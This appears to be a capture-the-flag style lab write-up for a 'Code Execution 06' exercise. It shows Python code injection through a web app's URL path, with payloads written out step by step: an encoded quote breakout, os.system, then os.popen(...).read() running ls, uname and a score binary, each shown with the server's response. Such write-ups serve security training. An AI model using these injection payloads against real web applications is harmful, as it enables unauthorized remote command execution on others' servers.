Code Execution 06

n this exercise, we are dealing with a Python application. Like with the previous exercise, we can see that injecting a double-quote give us an error.

First, let's see how we can properly close the double-quote. We can inject a + (properly encoded) and another double-quote to get a response without error.

Now, we need to make sure it's a Python application, we can for example use:
"%2bstr(True)%2b"test. The fact that both str() and True are available give us a pretty good chance that Python is used. For the rest of the challenge we will put our payload inside of the call to str().

Now, we want to get to code execution. We can try to use os.system('id') for example.

We can see a 0 coming back in the response. This shows that the command got executed successfully. If you try an invalid command like hacker, you will get 32512 meaning that the process returned 127 (since the command is not found).

It may also be valuable to get the value returned by the command. To do this, you can use: os.popen('[CMD]').read() instead of os.system('[CMD]').

Finally, by changing the call to id to the /usr/local/bin/score UUID command, you should be able to score this exercise. 

To finish this exercise, you need to run the binary (/usr/local/bin/score) with your UUID (dd19b1aa-7a48-4881-87ce-4fd3f96516f8) as first argument:
/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8

You can access this exercise using the following URL: http://ptc-6774c5ae-853fc3f6.libcurl.so/. You can also use the TLS version if you're experiencing timeouts due to network filtering: https://ptl-6774c5ae-853fc3f6.libcurl.so/.

Common Mistakes:

   * Make sure you replace the full netcat command with the score command followed by your UUID: /usr/local/bin/score ....

   Steps:
    1) Visit the given url: http://ptc-6774c5ae-853fc3f6.libcurl.so/.
    2) Try with single quote (') but it don't works. Then try with double quote (") this time we get Internal Server Error.
    3) "https://ptl-6774c5ae-853fc3f6.libcurl.so/hello/hacker"%2b"lol"%2b"
         It reflects as: Hello hackerlol!
    4) Try with os command: https://ptl-6774c5ae-853fc3f6.libcurl.so/hello/hacker%22%2bstr(os.popen(%22ls%22)%20)%2b%22
        Response: Hello hacker<open file 'ls', mode 'r' at 0x7f42e6624ed0>!
    5) Again add read code ()https://ptl-6774c5ae-853fc3f6.libcurl.so/hello/hacker%22%2bstr(os.popen(%22ls%22).read())%2b%22
        Response as: Hello hackerapp.py app.pyc static templates !
    6) Let's replace 'ls' command with 'uname -a'. It seems as: 
        https://ptl-6774c5ae-853fc3f6.libcurl.so/hello/hacker"+str(os.popen("uname -a").read())+"
        Respone as: Hello hackerLinux b053ec5198ea 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux !
    7)  Finally, replace 'uname' with '/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8'.
                https://ptl-6774c5ae-853fc3f6.libcurl.so/hello/hacker"+str(os.popen("/usr/local/bin/score dd19b1aa-7a48-4881-87ce-4fd3f96516f8").read())+"
    8)     Bravo!! Hello hackerExercise completed!! !

    Happy Hacking!! :) 